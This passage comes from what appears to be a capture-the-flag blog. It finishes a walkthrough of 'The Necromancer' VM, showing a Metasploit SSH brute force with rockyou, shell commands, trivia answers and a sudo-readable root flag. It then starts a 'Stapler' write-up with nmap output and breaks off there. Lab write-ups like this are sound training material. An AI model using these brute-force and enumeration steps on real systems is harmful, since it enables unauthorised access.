</span><span class='line'>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
</span><span class='line'>iso.3.6.1.2.1.1.3.0 = Timeticks: (2263758) 6:17:17.58
</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"</span></code></pre></td></tr></table></div></figure>


<p>With the door unlocked, we have the flag and next destination..SSH!</p>

<p>Flag #7: <strong>demonslayer</strong></p>

<h1>Flag #8 &ndash; demonslayer</h1>

<p>The SSH on the machine is accepting password logins, so it&rsquo;s time for the bruteforce approach. I&rsquo;ve used the combination of demonslayer as username and rockyou.txt as wordlist.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/ssh/ssh_login
</span><span class='line'>msf auxiliary(scanner/ssh/ssh_login) &gt; run
</span><span class='line'>
</span><span class='line'>[+] 192.168.223.128:22 - Success: 'demonslayer:12345678' 'uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer) OpenBSD thenecromancer 5.9 GENERIC#1761 amd64 '
</span><span class='line'>[*] Command shell session 1 opened (192.168.223.129:43627 -&gt; 192.168.223.128:22) at 2018-06-09 14:41:25 -0400</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve found the password is <em>12345678</em> and have a shell on the box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 1
</span><span class='line'>[*] Starting interaction with 1...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>demonslayer
</span><span class='line'>pwd
</span><span class='line'>/home/demonslayer
</span><span class='line'>ls -alh
</span><span class='line'>total 40
</span><span class='line'>drwxr-xr-x  3 demonslayer  demonslayer   512B Jun 23  2016 .
</span><span class='line'>drwxr-xr-x  3 root         wheel         512B May 11  2016 ..
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer    87B May 11  2016 .Xdefaults
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   773B May 11  2016 .cshrc
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   103B May 11  2016 .cvsrc
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   359B May 11  2016 .login
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   175B May 11  2016 .mailrc
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   218B May 11  2016 .profile
</span><span class='line'>drwx------  2 demonslayer  demonslayer   512B May 11  2016 .ssh
</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   706B May 11  2016 flag8.txt</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s read that flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat flag8.txt
</span><span class='line'>You enter the Necromancer's Lair!
</span><span class='line'>
</span><span class='line'>A stench of decay fills this place.  
</span><span class='line'>
</span><span class='line'>Jars filled with parts of creatures litter the bookshelves.
</span><span class='line'>
</span><span class='line'>A fire with flames of green burns coldly in the distance.
</span><span class='line'>
</span><span class='line'>Standing in the middle of the room with his back to you is the Necromancer.  
</span><span class='line'>
</span><span class='line'>In front of him lies a corpse, indistinguishable from any living creature you have seen before.
</span><span class='line'>
</span><span class='line'>He holds a staff in one hand, and the flickering object in the other.
</span><span class='line'>
</span><span class='line'>"You are a fool to follow me here!  Do you not know who I am!"
</span><span class='line'>
</span><span class='line'>The necromancer turns to face you.  Dark words fill the air!
</span><span class='line'>
</span><span class='line'>"You are damned already my friend.  Now prepare for your own death!" 
</span><span class='line'>
</span><span class='line'>Defend yourself!  Counter attack the Necromancer's spells at u777!</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve tried connecting to UDP 777, but nothing happened. So I tried next to connect to the local host from within the SSH shell. Netcat wasn&rsquo;t installed, but nc was:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -u localhost 777
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>** You only have 3 hitpoints left! **
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer's Spells!
</span><span class='line'>
</span><span class='line'>Where do the Black Robes practice magic of the Greater Path?  </span></code></pre></td></tr></table></div></figure>


<p>The battle is on! Seems we have to answer correctly, so I googled and found this on <a href="https://en.wikipedia.org/wiki/Tsurani">this Wikipedia page</a>:</p>

<blockquote><p>Great Ones, or Black Robes, are magicians on Kelewan who practice magic of the Greater
Path.</p></blockquote>

<p>Passing Kelewan as the answer reveals the 8th flag, which is the same as the answer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Where do the Black Robes practice magic of the Greater Path?  Kelewan
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag8{55a6af2ca3fee9f2fef81d20743bda2c}</span></code></pre></td></tr></table></div></figure>


<p>Flag #8: <strong>Kelewan</strong></p>

<h1>Flag #9 &ndash; Lord of the 8th plane of hell</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>** You only have 3 hitpoints left! **
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer's Spells!
</span><span class='line'>
</span><span class='line'>Who did Johann Faust VIII make a deal with?  </span></code></pre></td></tr></table></div></figure>


<p>Next quesch! I&rsquo;m proud to say I didn&rsquo;t need to google for this one :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Who did Johann Faust VIII make a deal with?  Mephistopheles
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag9{713587e17e796209d1df4c9c2c2d2966}</span></code></pre></td></tr></table></div></figure>


<p>The legend of Faust is well-known to me, and since you&rsquo;re reading this, I have to point you to 2 epic albums of Kamelot that are inspired by Faust: Epica and The Black Halo. You will thank me later.</p>

<p>Mephistopheles is also the demonlord of the 8th plane of hell in Neverwinter Nights: Hordes of the Underdark. Clearly I&rsquo;m having a nostalgic moment here!</p>

<p>Flag #9: <strong>Mephistopheles</strong></p>

<h1>Flag #10 &ndash; The Ninth Gate</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>** You only have 3 hitpoints left! **
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer's Spells!
</span><span class='line'>
</span><span class='line'>Who is tricked into passing the Ninth Gate?  </span></code></pre></td></tr></table></div></figure>


<p>Back to Google for this one and found the answer <a href="https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters">here</a>:</p>

<blockquote><p>Hedge is a necromancer in service of Orannis, who supplies Nicholas Sayre (in mistake
for Prince Sameth) as the latter&rsquo;s avatar. He is roughly 100 years old. Motivated by an
all-consuming desire for immortality, he believes that if he frees Orannis, he will
become viceroy over the Dead; but fails when tricked into passing the Ninth Gate.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Who is tricked into passing the Ninth Gate?  Hedge
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
</span><span class='line'>
</span><span class='line'>A great flash of light knocks you to the ground; momentarily blinding you!
</span><span class='line'>
</span><span class='line'>As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
</span><span class='line'>
</span><span class='line'>The room is silent.
</span><span class='line'>
</span><span class='line'>You walk over to where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>On the ground is a small vile.</span></code></pre></td></tr></table></div></figure>


<p>Flag #10: <strong>Hedge</strong></p>

<h1>Flag #11 &ndash; The elixir of power</h1>

<p>A small vile on the ground..a hidden .smallvile file in demonslayer&rsquo;s home!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat .smallvile
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>You pick up the small vile.
</span><span class='line'>
</span><span class='line'>Inside of it you can see a green liquid.
</span><span class='line'>
</span><span class='line'>Opening the vile releases a pleasant odour into the air.
</span><span class='line'>
</span><span class='line'>You drink the elixir and feel a great power within your veins!</span></code></pre></td></tr></table></div></figure>


<p>Immediately I thought of root privileges and looked at the sudo rights:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
</span><span class='line'>Matching Defaults entries for demonslayer on thenecromancer:
</span><span class='line'>    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
</span><span class='line'>
</span><span class='line'>User demonslayer may run the following commands on thenecromancer:
</span><span class='line'>    (ALL) NOPASSWD: /bin/cat /root/flag11.txt</span></code></pre></td></tr></table></div></figure>


<p>User demonslayer can read the 11th flag in root&rsquo;s home folder. Let&rsquo;s see the ending:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo /bin/cat /root/flag11.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Suddenly you feel dizzy and fall to the ground!
</span><span class='line'>
</span><span class='line'>As you open your eyes you find yourself staring at a computer screen.
</span><span class='line'>
</span><span class='line'>Congratulations!!! You have conquered......
</span><span class='line'>
</span><span class='line'>          .                                                      .
</span><span class='line'>        .n                   .                 .                  n.
</span><span class='line'>  .   .dP                  dP                   9b                 9b.    .
</span><span class='line'> 4    qXb         .       dX                     Xb       .        dXp     t
</span><span class='line'>dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
</span><span class='line'>9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
</span><span class='line'> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
</span><span class='line'>  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
</span><span class='line'>    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
</span><span class='line'>        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
</span><span class='line'>                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
</span><span class='line'>                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
</span><span class='line'>                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
</span><span class='line'>                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
</span><span class='line'>                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
</span><span class='line'>                     `'      9XXXXXX(   )XXXXXXP      `'
</span><span class='line'>                              XXXX X.`v'.X XXXX
</span><span class='line'>                              XP^X'`b   d'`X^XX
</span><span class='line'>                              X. 9  `   '  P )X
</span><span class='line'>                              `b  `       '  d'
</span><span class='line'>                               `             '                       
</span><span class='line'>                               THE NECROMANCER!
</span><span class='line'>                                 by  @xerubus
</span><span class='line'>
</span><span class='line'>                   flag11{42c35828545b926e79a36493938ab1b1}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Big shout out to Dook and Bull for being test bunnies.
</span><span class='line'>
</span><span class='line'>Cheers OJ for the obfuscation help.
</span><span class='line'>
</span><span class='line'>Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.
</span><span class='line'>
</span><span class='line'>"========================================="
</span><span class='line'>"  xerubus (@xerubus) - www.mogozobo.com  "
</span><span class='line'>"========================================="</span></code></pre></td></tr></table></div></figure>


<p>Flag #11: <strong>hackergod</strong></p>

<p>The necromancer is down! This was a really fun one, with a lot of challenge diversity and that text-based RPG feel and fantasy mentions! Thanks to xerubus for putting us face to face with the necromancer!</p>

<p>Some special fortune cookie:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ M: Last I knew, I thought I had trapped \
</span><span class='line'>| you for all eternity in an icy little   |
</span><span class='line'>| place called Cania                      |
</span><span class='line'>|                                         |
</span><span class='line'>| H: Sorry, Hell froze over.              |
</span><span class='line'>|                                         |
</span><span class='line'>| M: How very witty. But it takes more    |
</span><span class='line'>| than sharp wit to rule Hell, little     |
</span><span class='line'>\ one. You must also...dress the part.    /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Got a Stapler?]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/26/got-a-stapler/"/>
    <updated>2018-05-26T17:24:11-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/26/got-a-stapler</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is a VM made by g0tmi1k for BsidesLondon 2016. So this should be a fun one! From the description:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>| + There are multiple methods to-do this machine         |
</span><span class='line'>|   + At least two (2) paths to get a limited shell       |
</span><span class='line'>|   + At least three (3) ways to get a root access        |</span></code></pre></td></tr></table></div></figure>




<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE  SERVICE     VERSION
</span><span class='line'>20/tcp    closed ftp-data
</span><span class='line'>21/tcp    open   ftp         vsftpd 2.0.8 or later
</span><span class='line'>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>|_Can't get directory listing: PASV failed: 550 Permission denied.
</span><span class='line'>| ftp-syst: 
</span><span class='line'>|   STAT: 
</span><span class='line'>| FTP server status:
</span><span class='line'>|      Connected to 192.168.217.132
</span><span class='line'>|      Logged in as ftp
</span><span class='line'>|      TYPE: ASCII
</span><span class='line'>|      No session bandwidth limit
</span><span class='line'>|      Session timeout in seconds is 300
</span><span class='line'>|      Control connection is plain text
</span><span class='line'>|      Data connections will be plain text
</span><span class='line'>|      At session startup, client count was 2
</span><span class='line'>|      vsFTPd 3.0.3 - secure, fast, stable
</span><span class='line'>|_End of status
</span><span class='line'>22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
</span><span class='line'>|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
</span><span class='line'>|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
</span><span class='line'>53/tcp    open   domain      dnsmasq 2.75
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: dnsmasq-2.75
</span><span class='line'>80/tcp    open   http        PHP cli server 5.5 or later
</span><span class='line'>|_http-title: 404 Not Found
</span><span class='line'>123/tcp   closed ntp
</span><span class='line'>137/tcp   closed netbios-ns
</span><span class='line'>138/tcp   closed netbios-dgm
</span><span class='line'>139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>666/tcp   open   doom?
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   NULL: 
</span><span class='line'>|     message2.jpgUT 
</span><span class='line'>|     QWux
</span><span class='line'>|     "DL[E
</span><span class='line'>|     #;3[
</span><span class='line'>|     \xf6
</span><span class='line'>|     u([r
</span><span class='line'>|     qYQq
</span><span class='line'>|     Y_?n2
</span><span class='line'>|     3&M~{
</span><span class='line'>|     9-a)T
</span><span class='line'>|     L}AJ
</span><span class='line'>|_    .npy.9
</span><span class='line'>3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 10
</span><span class='line'>|   Version: 5.7.12-0ubuntu1
</span><span class='line'>|   Thread ID: 7
</span><span class='line'>|   Capabilities flags: 63487
</span><span class='line'>|   Some Capabilities: SupportsCompression, LongPassword, LongColumnFlag, ODBCClient, Support41Auth, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, FoundRows, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|   Salt: *o\x069%}F\x0B\x1B+'\x14l\x19PET8\x15J
</span><span class='line'>|_  Auth Plugin Name: 88
</span><span class='line'>12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: Tim, we need to-do better next year for Initech
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span class='line'>SF-Port666-TCP:V=7.70%I=7%D=5/27%Time=5B0A6560%P=x86_64-pc-linux-gnu%r(NUL
</span><span class='line'>SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
</span><span class='line'>SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
</span><span class='line'>SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
</span><span class='line'>SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
</span><span class='line'>SF:x0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
</span><span class='line'>SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
</span><span class='line'>SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
</span><span class='line'>SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
</span><span class='line'>SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
</span><span class='line'>SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
</span><span class='line'>SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
</span><span class='line'>SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
</span><span class='line'>SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
</span><span class='line'>SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
</span><span class='line'>SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
</span><span class='line'>SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\
</span><span class='line'>SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
</span><span class='line'>SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
</span><span class='line'>SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
</span><span class='line'>SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
